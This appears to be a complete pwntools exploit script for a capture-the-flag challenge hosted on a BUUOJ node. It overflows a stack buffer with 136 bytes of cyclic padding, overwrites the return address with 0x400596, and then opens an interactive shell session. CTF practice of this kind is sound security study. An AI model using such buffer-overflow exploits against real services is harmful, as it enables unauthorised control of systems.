from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 26344)

io.sendlineafter('Hello, World', cyclic(128+8) + p64(0x400596))

io.interactive()